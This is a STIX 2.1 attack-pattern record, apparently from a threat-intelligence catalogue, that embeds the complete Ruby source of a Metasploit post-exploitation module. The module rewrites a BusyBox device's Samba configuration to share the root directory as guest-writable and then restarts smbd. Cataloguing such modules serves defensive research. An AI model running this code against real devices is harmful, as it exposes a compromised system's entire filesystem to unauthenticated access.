{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0476e252-f7c4-4ea0-a5bc-200c64a00444",
    "created": "2024-08-14T16:33:13.584307Z",
    "modified": "2024-08-14T16:33:13.58431Z",
    "name": "BusyBox SMB Sharing",
    "description": " This module will be applied on a session connected to a BusyBox shell. It will modify the SMB configuration of the device executing BusyBox to share the root directory of the device. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/busybox/smb_share_root.rb",
            "external_id": "smb_share_root.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::BusyBox\n\n  def initialize\n    super(\n      'Name' => 'BusyBox SMB Sharing',\n      'Description' => %q{\n        This module will be applied on a session connected to a BusyBox shell. It will modify\n        the SMB configuration of the device executing BusyBox to share the root directory of\n        the device.\n      },\n      'Author' => 'Javier Vicente Vallejo',\n      'License' => MSF_LICENSE,\n      'Platform' => ['linux'],\n      'SessionTypes' => ['shell']\n    )\n  end\n\n  def run\n    print_status('Checking smb.conf...')\n    if busy_box_file_exist?('/var/samba/smb.conf')\n      print_status('smb.conf found, searching writable directory...')\n      writable_directory = busy_box_writable_dir\n      if writable_directory\n        print_status('writable directory found, copying smb.conf and restarting smbd')\n        copy_smb_conf(writable_directory)\n      else\n        print_error('Writable directory not found')\n      end\n    else\n      print_error('smb.conf not found')\n    end\n  end\n\n  def copy_smb_conf(dir)\n    cmd_exec_delay(\"rm -f #{dir}smb.conf\")\n    cmd_exec_delay(\"cp -f /var/samba/smb.conf #{dir}smb.conf\")\n    cmd_exec_delay(\"echo -e '[rootdir]\\ncomment = rootdir\\npath = /\\nbrowseable = yes\\nwriteable = yes\\nguest ok = yes\\n' >> #{dir}smb.conf\")\n    cmd_exec_delay('killall smbd')\n    cmd_exec_delay(\"smbd -D -s #{dir}smb.conf\")\n    cmd_exec_delay(\"smbd -D -s=#{dir}smb.conf\") # Uses equal just in case\n  end\n\n  def cmd_exec_delay(command)\n    res = cmd_exec(command)\n    vprint_status(res)\n    Rex.sleep(0.1)\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}